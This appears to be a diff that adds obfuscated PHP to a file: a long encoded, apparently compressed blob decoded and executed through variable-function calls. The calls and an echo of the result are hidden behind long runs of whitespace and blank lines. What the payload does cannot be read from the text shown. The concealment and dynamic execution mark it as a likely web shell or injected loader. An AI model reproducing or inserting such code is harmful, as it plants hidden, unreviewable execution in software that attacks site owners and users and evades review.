$_='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';
+
+        $___();$__________($______($__($_))); $________=$____();
+                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                             $_____();                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                       echo                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                      
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+                                                                                                                                                                                                                     $________;
